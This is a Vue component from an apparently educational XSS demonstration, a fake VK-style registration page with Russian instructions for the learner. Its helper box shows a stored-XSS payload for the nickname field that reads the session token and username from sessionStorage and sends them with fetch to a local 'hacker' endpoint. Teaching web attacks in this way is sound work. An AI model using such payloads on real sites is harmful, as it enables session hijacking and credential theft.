<template>
  <div class="vk__container">
    <div class="vk__header">
      <div class="vk__logo" @click="$router.push(`/xss`)">
        <img
            src="@/assets/img/VK.svg"
            alt="VS"
        />
        <p style="font-size: 2vw; margin-left: 0.7vw">ВСети</p>
      </div>
    </div>

    <div class="vk__registration__form">
      <p style="font-size: 1.5vw; font-weight: 500">РЕГИСТРАЦИЯ</p>
      <input
          class="vk__registration__input"
          placeholder="Никнейм"
          type="text"
          v-model="username"
      />
      <input
          class="vk__registration__input"
          placeholder="Пароль"
          type="password"
      />
      <button
          class="vk__registration__btn"
          @click="isRegister"
      >
        ЗАРЕГИСТРИРОВАТЬСЯ
      </button>
    </div>
    <anonymous-modal text-message="Тут мы введём никнейм (имя) пользователя c  закрывающим
                                  <br />HTML-тегом и скриптом, в котором будет код, отправляющий данные пользователя на адрес хакера.
                                  <br /><br />Рассмотрите и скопируйте код из чёрного окна, вставьте в поле “Никнейм”."></anonymous-modal>
      <div class="vk__helper__message">
        <span>NoName&lt;/p&gt;&lt;script&gt;<br/>
        const username = sessionStorage.getItem('username');<br/>
        const token = sessionStorage.getItem('token');<br/>
        console.log(username, token);<br/>
        fetch('http://localhost:8080/startXSS',{<br/>
        method: 'post',<br/>
        body:JSON.stringify({username,token})});&lt;/script&gt;&lt;p&gt;</span>
      </div>
  </div>
</template>

<script>
export default {
  data() {
    return {
      username: '',
      password: '',
    };
  },
  methods: {
    isRegister() {
      const token = Math.random().toString(36);
      sessionStorage.setItem('username', this.username);
      sessionStorage.setItem('token', token);
      this.$router.push(`/startXSS`);
    }
  }
}
</script>

<style scoped>
.vk__container {
  z-index: 0;
  width: 100vw;
  height: 100vh;
  background-color: rgba(237, 237, 239, 1);
  display: flex;
  flex-direction: column;
}

.vk__header {
  width: 100vw;
  height: 10vh;
  background-color: #FFFFFF;
  box-shadow: 0 0.5vh 0.5vh 0 rgba(0, 0, 0, 0.25);
  display: flex;
  align-items: center;
  padding: 0 4vw 0 4vw;
}

.vk__logo {
  display: flex;
  align-items: center;
  cursor: pointer;
}

img {
  z-index: 150;
  height: 6vh;
}

.vk__registration__form {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  height: 70vh;
  width: 100vw;
}

.vk__registration__input {
  width: 30vw;
  height: 5vh;
  padding-left: 1vw;
  border: none;
  margin-top: 2vh;
  border-radius: 0.7vw;
}

.vk__registration__input:focus {
  outline: 0.1vw solid rgba(49, 54, 172, 1);
}

.vk__registration__btn {
  font-size: 1.2vw;
  font-weight: 500;
  margin-top: 2vh;
  border: none;
  background-color: rgba(49, 54, 172, 1);
  color: white;
  width: 30vw;
  height: 5vh;
  cursor: pointer;
  border-radius: 0.7vw;
}

.vk__helper__message {
  border-radius: 1vw;
  background: #263238;
  width: 50vw;
  position: absolute;
  right: -3vw;
  z-index: 100;
  left: 5%;
  bottom: 5%;
  padding: 1.5vw 3vw 1.5vw 1.5vw;
}
.vk__helper__message span {
  color: rgba(53, 255, 49, 1);
}
</style>
